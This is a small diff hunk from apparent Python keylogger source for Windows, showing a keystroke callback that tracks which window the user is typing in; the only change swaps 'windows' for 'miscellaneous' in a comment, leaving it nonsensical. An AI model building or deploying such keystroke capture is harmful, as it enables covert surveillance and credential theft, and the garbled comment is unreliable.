@@ -42,7 +42,7 @@ class KeyLogger:
         windll.kernel32.CloseHandle(h_process)
 
     def mykeystroke(self, event):
-        # Check if the user has changed windows
+        # Check if the user has changed miscellaneous
         if event.WindowName != self.current_window:
             self.get_current_process()
 
